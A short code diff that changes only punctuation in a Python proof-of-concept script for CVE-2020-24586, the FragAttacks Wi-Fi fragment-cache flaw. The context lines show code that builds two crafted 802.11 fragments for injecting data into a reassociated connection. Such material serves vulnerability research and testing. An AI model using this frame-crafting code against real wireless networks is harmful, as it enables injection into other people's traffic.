@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CVE-2020-24586 — FragAttacks: fragment cache not cleared on (re)association.
+"""CVE-2020-24586 -- FragAttacks: fragment cache not cleared on (re)association.
 Stale cached fragments from a prior connection get mixed into a new one,
 so an attacker can inject/overwrite. Zero-click. Public (Vanhoef). HIGH."""
 import struct, sys
@@ -17,7 +17,7 @@ def build_fragment(more: bool, seq: int, payload: bytes,
             bytes.fromhex(src) + bytes.fromhex(bssid) + seqctl + payload)
 
 def build() -> bytes:
-    # frag 0 declares more to come; frag 1 completes — but the cache is stale
+    # frag 0 declares more to come; frag 1 completes -- but the cache is stale
     f0 = build_fragment(True, 0, b"\xaa\xaa\x03\x00\x00\x00\x08\x00" + b"A" * 8)
     f1 = build_fragment(False, 1, b"B" * 8)
     return f0 + f1
